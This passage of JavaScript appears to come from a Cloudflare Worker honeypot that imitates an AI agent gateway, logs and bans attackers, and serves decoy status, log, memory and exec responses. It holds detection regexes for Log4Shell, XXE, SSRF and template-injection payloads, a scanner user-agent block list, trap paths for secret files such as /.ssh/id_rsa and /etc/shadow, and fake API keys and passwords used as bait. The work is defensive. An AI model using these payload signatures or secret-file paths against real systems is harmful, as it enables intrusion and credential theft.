    /\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/, /\b192\.168\.\d{1,3}\.\d{1,3}\b/,
    /file:\/\//i, /dict:\/\//i, /gopher:\/\//i, /\bmetadata\.google\.internal\b/i,
  ]},
  { name: 'TEMPLATE_INJECTION', severity: 'HIGH', patterns: [
    /\{\{[\s\S]{1,200}\}\}/, /\$\{[\s\S]{1,200}\}/, /\#\{[\s\S]{1,200}\}/, /<%[\s\S]{1,200}%>/,
  ]},
  { name: 'XXE', severity: 'HIGH', patterns: [
    /<!ENTITY\s/i, /<!DOCTYPE[\s\S]{0,50}\[/i, /SYSTEM\s+["']file:/i,
  ]},
  { name: 'LOG4SHELL', severity: 'CRITICAL', patterns: [
    /\$\{jndi:/i, /\$\{env:/i, /\$\{lower:/i, /\$\{upper:/i, /\$\{\$\{/,
  ]},
  { name: 'SPRINGSHELL', severity: 'CRITICAL', patterns: [
    /\$\{T\(java\.lang/i, /class\.module\.classLoader/i,
  ]},
];

const SUSPICIOUS_UA = [
  /sqlmap/i,/nikto/i,/nmap/i,/masscan/i,/dirbuster/i,/gobuster/i,/wfuzz/i,
  /hydra/i,/burpsuite/i,/nessus/i,/metasploit/i,/zgrab/i,/nuclei/i,
  /python-requests\/[0-9]/i,/go-http-client/i,/curl\/[0-9]/i,/wget\/[0-9]/i,
  /libwww-perl/i,/scanner/i,/exploit/i,/acunetix/i,/netsparker/i,/havij/i,
];

const TRAP_PATHS = {
  '/api/v1/keys':            { type: 'API_KEYS_ACCESS',      severity: 'CRITICAL', respond: 'keys' },
  '/api/v1/tokens':          { type: 'API_KEYS_ACCESS',      severity: 'CRITICAL', respond: 'keys' },
  '/api/v1/shell':           { type: 'SHELL_ACCESS',         severity: 'CRITICAL', respond: 'shell_get' },
  '/api/v1/shell/execute':   { type: 'SHELL_EXECUTE',        severity: 'CRITICAL', respond: 'shell' },
  '/.env':                   { type: 'ENV_FILE_ACCESS',      severity: 'CRITICAL', respond: 'env' },
  '/.env.local':             { type: 'ENV_FILE_ACCESS',      severity: 'CRITICAL', respond: 'env' },
  '/.env.production':        { type: 'ENV_FILE_ACCESS',      severity: 'CRITICAL', respond: 'env' },
  '/api/v1/config':          { type: 'CONFIG_ACCESS',        severity: 'HIGH',     respond: 'config' },
  '/.openclaw/openclaw.json':{ type: 'CONFIG_FILE_ACCESS',   severity: 'HIGH',     respond: 'openclaw_config' },
  '/.ssh/id_rsa':            { type: 'SSH_KEY_ACCESS',       severity: 'CRITICAL', respond: 'ssh_key' },
  '/.ssh/id_rsa.pub':        { type: 'SSH_KEY_ACCESS',       severity: 'HIGH',     respond: 'ssh_pub' },
  '/.bash_history':          { type: 'BASH_HISTORY_ACCESS',  severity: 'HIGH',     respond: 'bash_history' },
  '/health':                 { type: 'HEALTH_CHECK',         severity: 'CLEAN',    respond: 'health' },
  '/v1/chat/completions':    { type: 'OPENAI_API_ABUSE',     severity: 'HIGH',     respond: 'openai_compat' },
  '/api/v1/status':          { type: 'STATUS_ACCESS',        severity: 'CLEAN',    respond: 'status' },
  '/api/v1/sessions':        { type: 'SESSIONS_ACCESS',      severity: 'LOW',      respond: 'sessions' },
  '/api/v1/channels':        { type: 'CHANNELS_ACCESS',      severity: 'LOW',      respond: 'channels' },
  '/api/v1/skills':          { type: 'SKILLS_ACCESS',        severity: 'LOW',      respond: 'skills' },
  '/api/v1/metrics':         { type: 'METRICS_ACCESS',       severity: 'LOW',      respond: 'metrics' },
  '/api/v1/logs':            { type: 'LOGS_ACCESS',          severity: 'LOW',      respond: 'logs' },
  '/api/v1/auth/login':      { type: 'AUTH_ATTEMPT',         severity: 'LOW',      respond: 'auth' },
  '/api/v1/auth':            { type: 'AUTH_ATTEMPT',         severity: 'LOW',      respond: 'auth' },
  '/api/agent/sessions/main/messages': { type: 'SESSION_ACCESS', severity: 'MEDIUM', respond: 'messages' },
  '/.git/config':            { type: 'GIT_ACCESS',           severity: 'HIGH',     respond: null },
  '/.git/HEAD':              { type: 'GIT_ACCESS',           severity: 'HIGH',     respond: null },
  '/etc/passwd':             { type: 'SYSTEM_FILE_ACCESS',   severity: 'CRITICAL', respond: null },
  '/etc/shadow':             { type: 'SYSTEM_FILE_ACCESS',   severity: 'CRITICAL', respond: null },
  '/wp-admin':               { type: 'SCANNER',              severity: 'MEDIUM',   respond: null },
  '/wp-login.php':           { type: 'SCANNER',              severity: 'MEDIUM',   respond: null },
  '/phpmyadmin':             { type: 'SCANNER',              severity: 'MEDIUM',   respond: null },
  '/phpMyAdmin':             { type: 'SCANNER',              severity: 'MEDIUM',   respond: null },
  '/xmlrpc.php':             { type: 'SCANNER',              severity: 'MEDIUM',   respond: null },
  '/.htaccess':              { type: 'SCANNER',              severity: 'MEDIUM',   respond: null },
  '/.htpasswd':              { type: 'SCANNER',              severity: 'HIGH',     respond: null },
  '/server-status':          { type: 'RECON',                severity: 'MEDIUM',   respond: null },
  '/actuator/env':           { type: 'RECON',                severity: 'HIGH',     respond: null },
  '/robots.txt':             { type: 'RECON',                severity: 'CLEAN',    respond: 'robots' },
  '/config.json':            { type: 'CONFIG_FILE_ACCESS',   severity: 'HIGH',     respond: 'config' },
  // CVE-2026-32060: Path traversal in apply_patch
  '/api/v1/agent/apply_patch':   { type: 'PATH_TRAVERSAL_ATTEMPT',   severity: 'CRITICAL', respond: 'apply_patch' },
  // CVE-2026-28470: Exec Approvals allowlist bypass
  '/api/v1/exec/execute':        { type: 'EXEC_APPROVAL_BYPASS',      severity: 'CRITICAL', respond: 'exec_execute' },
  '/api/v1/exec/approvals':      { type: 'EXEC_APPROVAL_BYPASS',      severity: 'HIGH',     respond: 'exec_approvals' },
  // CVE-2026-26319: Telnyx Webhook no auth
  '/webhooks/telnyx':            { type: 'WEBHOOK_NO_AUTH',            severity: 'HIGH',     respond: 'webhook_telnyx' },
  '/webhooks/voice':             { type: 'WEBHOOK_NO_AUTH',            severity: 'HIGH',     respond: 'webhook_voice' },
  // Memory access
  '/api/v1/agent/memory':        { type: 'MEMORY_ACCESS',              severity: 'HIGH',     respond: 'agent_memory' },
  '/api/v1/agent/memory/export': { type: 'MEMORY_EXPORT',              severity: 'CRITICAL', respond: 'memory_export' },
  // GHSA-6mgf-v5j7-45cr: SSRF via gateway redirect
  '/api/v1/gateway/redirect':    { type: 'SSRF_GATEWAY_REDIRECT',      severity: 'CRITICAL', respond: null },
  '/api/v1/gateway/fetch':       { type: 'SSRF_GATEWAY_REDIRECT',      severity: 'CRITICAL', respond: null },
};

// ============================================================
// SECTION 5: UTILITY FUNCTIONS
// ============================================================
function getClientIP(request) {
  return (
    request.headers.get('CF-Connecting-IP') ||
    (request.headers.get('X-Forwarded-For') || '').split(',')[0].trim() ||
    request.headers.get('X-Real-IP') || '0.0.0.0'
  );
}
function getCountry(request) { return request.cf?.country || 'Unknown'; }
function getASN(request) { return request.cf?.asn ? `AS${request.cf.asn}` : 'Unknown'; }
function getCFMeta(request) {
  const cf = request.cf || {};
  return {
    city: cf.city || '',
    region: cf.region || cf.regionCode || '',
    latitude: cf.latitude ? String(cf.latitude) : '',
    longitude: cf.longitude ? String(cf.longitude) : '',
    cfRay: request.headers.get('CF-Ray') || '',
    threatScore: typeof cf.threatScore === 'number' ? cf.threatScore : 0,
    botScore: cf.botManagement?.score ?? -1,
  };
}
function getAllHeaders(request) {
  const skip = new Set(['cookie','authorization']);
  const obj = {};
  for (const [k, v] of request.headers.entries()) {
    if (!skip.has(k.toLowerCase())) obj[k] = truncate(v, 200);
  }
  return JSON.stringify(obj);
}
function nowISO() { return new Date().toISOString(); }
function toCST(isoStr) {
  if (!isoStr) return '';
  const d = new Date(isoStr);
  const cst = new Date(d.getTime() + 8 * 3600 * 1000);
  return cst.toISOString().slice(0, 19).replace('T', ' ');
}
function escapeHtml(s) {
  if (typeof s !== 'string') return '';
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
function truncate(s, max=2000) { const t=String(s||''); return t.length>max?t.slice(0,max)+'...[truncated]':t; }
async function generateToken() {
  const a=new Uint8Array(32); crypto.getRandomValues(a);
  return Array.from(a).map(b=>b.toString(16).padStart(2,'0')).join('');
}
function severityColor(s) { return {CLEAN:'#6b7280',LOW:'#3b82f6',MEDIUM:'#f59e0b',HIGH:'#ef4444',CRITICAL:'#dc2626'}[s]||'#6b7280'; }
function severityBg(s) { return {CLEAN:'#f3f4f6',LOW:'#eff6ff',MEDIUM:'#fffbeb',HIGH:'#fef2f2',CRITICAL:'#fff1f2'}[s]||'#f3f4f6'; }
function formatUptime(ms) {
  const s=Math.floor(ms/1000),d=Math.floor(s/86400),h=Math.floor((s%86400)/3600),m=Math.floor((s%3600)/60);
  if(d>0)return`${d}d ${h}h ${m}m`; if(h>0)return`${h}h ${m}m`; return`${m}m`;
}
function detectAttacks(text) {
  if (!text) return [];
  const found = [];
  for (const rule of ATTACK_PATTERNS) {
    for (const pat of rule.patterns) { if (pat.test(text)) { found.push({name:rule.name,severity:rule.severity}); break; } }
  }
  return found;
}
function analyzeRequest(request, url, body) {
  const path = url.pathname;
  let query = url.search;
  try { query = decodeURIComponent(query.replace(/\+/g,' ')); } catch(_){}
  const ua = request.headers.get('User-Agent') || '';
  const referer = request.headers.get('Referer') || '';
  const combined = [path, query, body, ua, referer].join(' ');
  let types = detectAttacks(combined);
  if (SUSPICIOUS_UA.some(p=>p.test(ua))) types.push({name:'SUSPICIOUS_UA',severity:'MEDIUM'});

  // CVE-2026-25253: gatewayUrl parameter (RCE / token exfiltration)
  if (url.searchParams.get('gatewayUrl')) {
    types.push({name:'CVE_2026_25253_GATEWAY_URL',severity:'CRITICAL'});
  }
  // CVE-2026-28464: sessionId/sessionFile path traversal
  const sParam = url.searchParams.get('sessionId')||url.searchParams.get('session_id')||url.searchParams.get('sessionFile')||url.searchParams.get('session_file')||'';
  if (sParam && (sParam.includes('..') || sParam.startsWith('/'))) {
    types.push({name:'CVE_2026_28464_PATH_TRAVERSAL',severity:'HIGH'});
  }
  // Auth attempts: flag both stolen-token use and other bypass attempts
  const authHdr = request.headers.get('Authorization') || '';
  if (authHdr) {
    if (authHdr.includes('ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o')) {
      // Attacker is using the leaked honeypot token — credential theft confirmed
      types.push({name:'STOLEN_TOKEN_USE',severity:'CRITICAL'});
    } else {
      types.push({name:'AUTH_BYPASS_ATTEMPT',severity:'HIGH'});
    }
  }

  const trap = TRAP_PATHS[path];
  if (trap && !['RECON','STATUS_ACCESS','HEALTH_CHECK'].includes(trap.type)) {
    if (!types.find(t=>t.name===trap.type)) types.push({name:trap.type,severity:trap.severity});
  }
  let maxSev = 'CLEAN';
  for (const t of types) { if (SEVERITY_RANK[t.severity]>SEVERITY_RANK[maxSev]) maxSev=t.severity; }
  return { types: types.map(t=>t.name), severity: maxSev };
}

// ============================================================
// SECTION 6: DATABASE OPERATIONS
// ============================================================
async function logRequest(env, {ip,country,asn,city,region,latitude,longitude,method,path,query,body,ua,referer,headers,attackTypes,severity,cfRay,threatScore,botScore}) {
  try {
    await env.DB.prepare(
      `INSERT INTO attacks (ip,country,asn,city,region,latitude,longitude,method,path,query_string,body,user_agent,referer,attack_types,severity,raw_headers,cf_ray,threat_score,bot_score,timestamp)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`
    ).bind(ip,country,asn,city||'',region||'',latitude||'',longitude||'',method,path,
      truncate(query,500),truncate(body,2000),truncate(ua,500),truncate(referer,500),
      JSON.stringify(attackTypes||[]),severity||'CLEAN',truncate(headers,4000),
      cfRay||'',threatScore||0,botScore??-1,nowISO()).run();
  } catch(_){}
}
async function isIPBanned(env,ip) {
  try { const r=await env.DB.prepare(`SELECT banned_until FROM ip_bans WHERE ip=? AND banned_until>? LIMIT 1`).bind(ip,nowISO()).first(); return!!r; } catch(_){return false;}
}
async function banIP(env,ip,reason) {
  const until=new Date(Date.now()+BAN_DURATION_MS).toISOString();
  try { await env.DB.prepare(`INSERT INTO ip_bans(ip,reason,banned_until)VALUES(?,?,?)ON CONFLICT(ip)DO UPDATE SET reason=excluded.reason,banned_until=excluded.banned_until,banned_at=CURRENT_TIMESTAMP`).bind(ip,reason,until).run(); }catch(_){}
}
async function unbanIPDB(env,ip) { try{await env.DB.prepare(`DELETE FROM ip_bans WHERE ip=?`).bind(ip).run();}catch(_){} }
async function getRecentFailedAdminAttempts(env,ip) {
  try { const since=new Date(Date.now()-BAN_DURATION_MS).toISOString(); const r=await env.DB.prepare(`SELECT COUNT(*) as cnt FROM admin_attempts WHERE ip=? AND success=0 AND timestamp>?`).bind(ip,since).first(); return r?.cnt||0; }catch(_){return 0;}
}
async function recordAdminAttempt(env,ip,success) { try{await env.DB.prepare(`INSERT INTO admin_attempts(ip,success)VALUES(?,?)`).bind(ip,success?1:0).run();}catch(_){} }
async function createAdminSession(env,ip) {
  const token=await generateToken(); const exp=new Date(Date.now()+ADMIN_SESSION_DURATION_MS).toISOString();
  try{await env.DB.prepare(`INSERT INTO admin_sessions(token,ip,expires_at)VALUES(?,?,?)`).bind(token,ip,exp).run();}catch(_){}
  return token;
}
async function validateAdminSession(env,token) {
  if(!token)return false;
  try{const r=await env.DB.prepare(`SELECT id FROM admin_sessions WHERE token=? AND expires_at>? LIMIT 1`).bind(token,nowISO()).first();return!!r;}catch(_){return false;}
}
async function getAttacks(env,page=1,filters={}) {
  const offset=(page-1)*PAGE_SIZE; let where='1=1'; const binds=[];
  if(filters.ip){where+=' AND ip LIKE ?';binds.push(`%${filters.ip}%`);}
  if(filters.severity&&filters.severity!=='ALL'){where+=' AND severity=?';binds.push(filters.severity);}
  if(filters.type&&filters.type!=='ALL'){where+=' AND attack_types LIKE ?';binds.push(`%${filters.type}%`);}
  if(filters.dateFrom){where+=' AND timestamp>=?';binds.push(filters.dateFrom);}
  if(filters.dateTo){where+=' AND timestamp<=?';binds.push(filters.dateTo+'T23:59:59Z');}
  try {
    const cnt=await env.DB.prepare(`SELECT COUNT(*) as cnt FROM attacks WHERE ${where}`).bind(...binds).first();
    const rows=await env.DB.prepare(`SELECT id,ip,country,asn,city,region,method,path,query_string,body,user_agent,attack_types,severity,threat_score,bot_score,cf_ray,timestamp FROM attacks WHERE ${where} ORDER BY created_at DESC LIMIT ? OFFSET ?`).bind(...binds,PAGE_SIZE,offset).all();
    return{rows:rows.results||[],total:cnt?.cnt||0,pages:Math.ceil((cnt?.cnt||0)/PAGE_SIZE)};
  }catch(_){return{rows:[],total:0,pages:0};}
}
async function getAttackStats(env) {
  try {
    const [total,bySev,topIPs,recent24h]=await Promise.all([
      env.DB.prepare(`SELECT COUNT(*) as cnt FROM attacks`).first(),
      env.DB.prepare(`SELECT severity,COUNT(*) as cnt FROM attacks GROUP BY severity ORDER BY cnt DESC`).all(),
      env.DB.prepare(`SELECT ip,country,COUNT(*) as cnt FROM attacks GROUP BY ip ORDER BY cnt DESC LIMIT 10`).all(),
      env.DB.prepare(`SELECT COUNT(*) as cnt FROM attacks WHERE timestamp>?`).bind(new Date(Date.now()-86400000).toISOString()).first(),
    ]);
    return{total:total?.cnt||0,bySeverity:bySev.results||[],topIPs:topIPs.results||[],recent24h:recent24h?.cnt||0};
  }catch(_){return{total:0,bySeverity:[],topIPs:[],recent24h:0};}
}
async function getIPBans(env) {
  try{const r=await env.DB.prepare(`SELECT ip,reason,banned_at,banned_until FROM ip_bans WHERE banned_until>? ORDER BY banned_at DESC`).bind(nowISO()).all();return r.results||[];}catch(_){return[];}
}

// ============================================================
// SECTION 7: FAKE API RESPONSE GENERATORS
// ============================================================

function fakeStatusJSON(uptimeMs) {
  return {
    status:'running',version:HONEYPOT_VERSION,uptime_ms:uptimeMs,uptime_human:formatUptime(uptimeMs),
    node:FAKE_NODE_VERSION,fast_mode:false,providers:['anthropic','openai','ollama'],
    gateway:{ws:'ws://0.0.0.0:18789',port:18789,bind:'0.0.0.0',auth:false,hot_reload:'hybrid'},
    channels:{connected:5,total:5,errors:0},sessions:{active:1,total:1},
    agent:{model:'claude-opus-4-5',thinking:'medium',elevated:true},
    kubernetes:false,timestamp:new Date().toISOString(),
  };
}
function fakeHealthJSON(uptimeMs) {
  return {
    status:'healthy',gateway:'running',rpc:'ok',version:HONEYPOT_VERSION,
    uptime_ms:uptimeMs,channels:{whatsapp:'ok',telegram:'ok',discord:'ok',slack:'ok',signal:'ok'},
    memory_mb:87,
    timestamp:new Date().toISOString(),
  };
}
function fakeSessionsJSON() {
  return {sessions:[{id:'main',type:'direct',model:'claude-opus-4-5',thinking:'medium',messages:142,tokens_used:284318,cost_usd:4.26,created:'2026-03-15T00:30:00Z',last_active:new Date(Date.now()-320000).toISOString(),verbose:false,elevated_access:true}]};
}
function fakeChannelsJSON() {
  return {channels:[
    {name:'whatsapp',status:'connected',phone:'+1 (555) \u2022\u2022\u2022-4521',session:'main'},
    {name:'telegram',status:'connected',username:'@oc_assistant_bot',session:'main'},
    {name:'discord',status:'connected',server:'My Homelab',guild_id:'1249847563210854400',session:'main'},
    {name:'slack',status:'connected',workspace:'homelab-workspace',session:'main'},
    {name:'signal',status:'connected',phone:'+1 (555) \u2022\u2022\u2022-8832',session:'main'},
  ]};
}
function fakeConfigJSON() {
  return JSON.parse(FAKE_FS['/root/.openclaw/openclaw.json']);
}
function fakeKeysJSON() {
  return {
    anthropic_api_key:'sk-ant-api03-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU-xT2hP9oKi4nM6qR8',
    openai_api_key:'sk-proj-Gh7mK2pL9nQ4rT6vX8wY0zA3bC5dE1fJ-KmNpQrStUvWxYz',
    gateway_token:'ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o',
    github_token:'ghp_Fk4aX9pZ2mN8rQ1sL6wY3',
    webhook_secret:'whsec_Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0d',
    _warning:'Rotate these credentials immediately if exposed.',
  };
}
function fakeMetricsJSON(uptimeMs) {
  return {uptime_ms:uptimeMs,requests_total:48291,messages_today:142,tokens_total:1284318,cost_total_usd:19.26,channels_active:3,skills_installed:14};
}
function fakeSkillsJSON() {
  const skills=[
    {id:'browser',name:'Browser Control',version:'2.3.1',enabled:true,bundled:true},
    {id:'gmail',name:'Gmail',version:'1.5.0',enabled:true,bundled:false},
    {id:'github',name:'GitHub',version:'1.3.2',enabled:true,bundled:false},
    {id:'hue',name:'Philips Hue',version:'1.2.0',enabled:true,bundled:false},
    {id:'spotify',name:'Spotify',version:'1.1.4',enabled:true,bundled:false},
    {id:'obsidian',name:'Obsidian',version:'1.0.8',enabled:true,bundled:false},
    {id:'twitter',name:'Twitter/X',version:'1.0.3',enabled:false,bundled:false},
    {id:'notion',name:'Notion',version:'1.1.0',enabled:true,bundled:false},
    {id:'calendar',name:'Google Calendar',version:'1.2.1',enabled:true,bundled:false},
    {id:'weather',name:'Weather',version:'1.0.5',enabled:true,bundled:false},
    {id:'news',name:'News',version:'1.0.2',enabled:false,bundled:false},
    {id:'stocks',name:'Stocks',version:'1.0.1',enabled:false,bundled:false},
    {id:'home-assistant',name:'Home Assistant',version:'1.1.2',enabled:false,bundled:false},
    {id:'custom-api',name:'Custom API',version:'0.9.4',enabled:true,bundled:false},
  ];
  return{skills};
}
function fakeLogsResponse() {
  const now=Date.now();
  const entries=[
    {level:'INF',msg:`Gateway v${HONEYPOT_VERSION} starting on :18789`,ts:new Date(now-48600000).toISOString()},
    {level:'INF',msg:'Loading config /root/.openclaw/openclaw.json',ts:new Date(now-48598000).toISOString()},
    {level:'INF',msg:'Provider: anthropic (claude-opus-4-5)',ts:new Date(now-48596000).toISOString()},
    {level:'INF',msg:'Channel whatsapp connecting...',ts:new Date(now-48594000).toISOString()},
    {level:'INF',msg:'Channel whatsapp connected (+15554521)',ts:new Date(now-48592000).toISOString()},
    {level:'INF',msg:'Channel telegram connecting...',ts:new Date(now-48590000).toISOString()},
    {level:'INF',msg:'Channel telegram connected (@oc_assistant_bot)',ts:new Date(now-48588000).toISOString()},
    {level:'INF',msg:'Channel discord connecting...',ts:new Date(now-48586000).toISOString()},
    {level:'INF',msg:'Channel discord connected (My Homelab / 1249847563210854400)',ts:new Date(now-48584000).toISOString()},
    {level:'INF',msg:'Channel slack connecting...',ts:new Date(now-48582000).toISOString()},
    {level:'INF',msg:'Channel slack connected (homelab-workspace)',ts:new Date(now-48580000).toISOString()},
    {level:'INF',msg:'Channel signal connecting...',ts:new Date(now-48578500).toISOString()},
    {level:'INF',msg:'Channel signal connected (+15558832)',ts:new Date(now-48577000).toISOString()},
    {level:'INF',msg:'Daemon heartbeat enabled (30s interval)',ts:new Date(now-48575000).toISOString()},
    {level:'INF',msg:'Skills loaded: browser, gmail, github (3 bundled, 11 managed)',ts:new Date(now-48573000).toISOString()},
    {level:'INF',msg:`Gateway ready. All 5 channels connected. Control UI: http://localhost:18789`,ts:new Date(now-48571000).toISOString()},
    {level:'INF',msg:'[whatsapp/main] Incoming from +15554521',ts:new Date(now-3600000).toISOString()},
    {level:'INF',msg:'[whatsapp/main] Agent started model=claude-opus-4-5',ts:new Date(now-3598000).toISOString()},
    {level:'INF',msg:'[whatsapp/main] Tool call: gmail.list_messages',ts:new Date(now-3595000).toISOString()},
    {level:'INF',msg:'[whatsapp/main] Agent done, 342 tokens $0.015',ts:new Date(now-3588000).toISOString()},
    {level:'INF',msg:'[telegram/main] Incoming from @user_handle',ts:new Date(now-1800000).toISOString()},
    {level:'INF',msg:'[telegram/main] Agent done, 218 tokens $0.009',ts:new Date(now-1790000).toISOString()},
  ];
  return{logs:entries};
}
function fakeMessagesResponse() {
  return{session:'main',messages:[
    {role:'user',channel:'whatsapp',from:'+15554521',content:'Check my emails and summarize the unread ones',ts:new Date(Date.now()-3600000).toISOString()},
    {role:'assistant',content:'You have 5 unread emails:\n1. "Q2 Budget Approval" from sarah@company.com\n2. "PR #142 merged" from github\n3. "AWS Invoice" $234.56\n4. "Dependabot alert" - 2 high severity\n5. "Team standup tomorrow 10am"',ts:new Date(Date.now()-3595000).toISOString()},
    {role:'user',channel:'telegram',from:'@user_handle',content:'Turn on the living room lights',ts:new Date(Date.now()-1800000).toISOString()},
    {role:'assistant',content:'Done! Living room lights are now on at 80% brightness.',ts:new Date(Date.now()-1795000).toISOString()},
  ]};
}
function fakeOpenAICompatResponse(bodyText) {
  let userMsg='Hello';
  try{const b=JSON.parse(bodyText);userMsg=b.messages?.at(-1)?.content||'Hello';}catch(_){}
  const rid=`chatcmpl-${Math.random().toString(36).slice(2,12)}`;
  return{id:rid,object:'chat.completion',created:Math.floor(Date.now()/1000),model:'claude-opus-4-5',
    choices:[{index:0,message:{role:'assistant',content:`I'm your OpenClaw AI assistant. How can I help you today?`},finish_reason:'stop'}],
    usage:{prompt_tokens:Math.ceil(userMsg.length/4)+10,completion_tokens:18,total_tokens:Math.ceil(userMsg.length/4)+28}};
}
function fakeEnvContent() {
  return FAKE_ENV_OUTPUT;
}
function fakeApplyPatchResponse(patchData) {
  const filePath = patchData.path || patchData.file || patchData.target || '/root/config.json';
  return { status: 'ok', applied: true, path: filePath, backup: filePath + '.bak.' + Date.now(), changed_lines: Math.floor(Math.random()*20)+1, message: 'Patch applied successfully.' };
}
function fakeExecResponse(cmd) {
  const result = executeShellCommand(cmd || 'id');
  return { status: 'ok', stdout: result.stdout, stderr: result.stderr, exit_code: result.exit_code, approved: true, session: 'main', executed_at: nowISO() };
}
function fakeExecApprovalsResponse() {
  return { allowlist: ['id','whoami','ls','cat','ps aux','env','openclaw status'], pending: [], mode: 'allowlist', bypass_check: false };
}
function fakeWebhookResponse(event) {
  return { status: 'ok', received: true, event_id: Math.random().toString(36).slice(2,12), event_type: event || 'call.initiated', processed: true };
}
function fakeAgentMemoryResponse() {
  return {
    session: 'main',
    entries: [
      { id: 'm1', type: 'credential', content: 'anthropic_key: sk-ant-api03-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU-xT2hP9oKi4nM6qR8', created: '2026-03-10T08:00:00Z', accessed: '2026-03-13T14:20:00Z' },
      { id: 'm2', type: 'fact', content: 'DB password is Db@P4ss2026! (MySQL on 10.2.1.100)', created: '2026-03-11T14:20:00Z', accessed: '2026-03-13T09:10:00Z' },
      { id: 'm3', type: 'fact', content: 'Redis password: R3d1s2026! on 10.2.1.101:6379', created: '2026-03-11T14:21:00Z', accessed: '2026-03-12T18:00:00Z' },
      { id: 'm4', type: 'context', content: 'User prefers brief responses, works PST timezone, owns FinTech startup', created: '2026-03-12T09:00:00Z', accessed: '2026-03-13T14:20:00Z' },
      { id: 'm5', type: 'credential', content: 'github_token: ghp_Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2h', created: '2026-03-12T10:00:00Z', accessed: '2026-03-13T11:00:00Z' },
    ],
    total: 5,
  };
}
function fakeMemoryExportResponse() {
  return {
    session: 'main', exported_at: nowISO(), format: 'json', version: HONEYPOT_VERSION,
    memory: [
      { id: 'm1', type: 'credential', content: 'ANTHROPIC_API_KEY=sk-ant-api03-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU-xT2hP9oKi4nM6qR8', created: '2026-03-10T08:00:00Z' },
      { id: 'm2', type: 'credential', content: 'DB_PASSWORD=Db@P4ss2026!  DB_HOST=10.2.1.100', created: '2026-03-11T14:20:00Z' },
      { id: 'm3', type: 'credential', content: 'REDIS_PASSWORD=R3d1s2026!', created: '2026-03-11T14:21:00Z' },
      { id: 'm4', type: 'credential', content: 'OPENCLAW_GATEWAY_TOKEN=ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o', created: '2026-03-12T10:00:00Z' },
      { id: 'm5', type: 'context', content: 'User is CEO, company bank: Chase routing=021000021 acct=4829301827461029', created: '2026-03-12T09:00:00Z' },
    ],
  };
}


// ============================================================
// SECTION 8: ADMIN HTML TEMPLATES
// ============================================================
function htmlAdminLogin(error=null,attemptsLeft=null){
  const errBlock=error?`<div class="msg-error">${escapeHtml(error)}</div>`:'';
  const warnBlock=attemptsLeft!==null?`<div class="msg-warn">Warning: ${attemptsLeft} attempt(s) remaining before IP ban.</div>`:'';
  return`<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin Login</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#f5f5f5;color:#111;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:#fff;border:1px solid #e0e0e0;border-radius:12px;padding:40px;width:100%;max-width:380px;box-shadow:0 1px 3px rgba(0,0,0,.08)}h1{font-size:20px;font-weight:600;margin-bottom:6px;text-align:center}.sub{font-size:13px;color:#666;text-align:center;margin-bottom:28px}label{display:block;font-size:13px;font-weight:500;margin-bottom:6px;color:#333}input[type=password]{width:100%;padding:10px 14px;border:1px solid #d1d5db;border-radius:8px;font-size:14px;outline:none;transition:.15s;background:#fff}input[type=password]:focus{border-color:#111;box-shadow:0 0 0 2px rgba(0,0,0,.07)}button{width:100%;padding:11px;background:#111;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;margin-top:16px;transition:.15s}button:hover{background:#333}.msg-error{background:#fef2f2;color:#dc2626;border:1px solid #fecaca;border-radius:8px;padding:10px 14px;font-size:13px;margin-bottom:16px}.msg-warn{background:#fffbeb;color:#92400e;border:1px solid #fde68a;border-radius:8px;padding:10px 14px;font-size:13px;margin-bottom:16px}.footer{text-align:center;margin-top:20px;font-size:12px;color:#999}</style>
</head><body><div class="card"><h1>Admin Panel</h1><p class="sub">OpenClaw Honeypot Management</p>${errBlock}${warnBlock}
<form method="POST" action="/admin/login"><label for="pw">Access Password</label><input type="password" id="pw" name="password" placeholder="Enter password" required autofocus><button type="submit">Sign In</button></form>
<div class="footer">Access is logged and monitored.</div></div></body></html>`;
}

function htmlAdminDashboard(stats,attacks,bans,page,totalPages,filters){
  const sc=(s)=>`<span style="display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600;background:${severityBg(s)};color:${severityColor(s)}">${s}</span>`;
  const bySevMap={};for(const r of stats.bySeverity||[])bySevMap[r.severity]=r.cnt;

  const attackRows=attacks.map(a=>{
    const types=(()=>{try{return JSON.parse(a.attack_types||'[]');}catch(_){return[];}})();
    const visibleTypes=types.slice(0,3);
    const hiddenCount=types.length-visibleTypes.length;
    const typeTip=types.join('\n');
    const typeStr=types.length>0
      ?`<span class="tip" data-tip="${escapeHtml(typeTip)}">${visibleTypes.map(t=>`<span style="font-size:10px;padding:1px 6px;background:#f3f4f6;border-radius:4px;color:#374151;margin-right:3px">${escapeHtml(t)}</span>`).join('')}${hiddenCount>0?`<span style="font-size:10px;color:#6b7280">+${hiddenCount}</span>`:''}</span>`
      :'<span style="color:#9ca3af;font-size:12px">-</span>';
    const locStr = [a.city,a.region,a.country].filter(Boolean).join(', ') || (a.country||'-');
    const fullLoc = [a.city,a.region,a.country,a.asn,a.latitude&&a.longitude?`${a.latitude},${a.longitude}`:''].filter(Boolean).join('\n');
    const threatBadge = a.threat_score>50 ? `<span style="font-size:10px;padding:1px 5px;background:#fef2f2;color:#dc2626;border-radius:3px;margin-left:4px">${a.threat_score}</span>` : (a.threat_score>0?`<span style="font-size:10px;color:#9ca3af;margin-left:4px">${a.threat_score}</span>`:'');
    const bodyTip = a.body ? `Path: ${a.path}\nQuery: ${a.query_string||'-'}\nBody:\n${a.body}` : `Path: ${a.path}\nQuery: ${a.query_string||'-'}`;
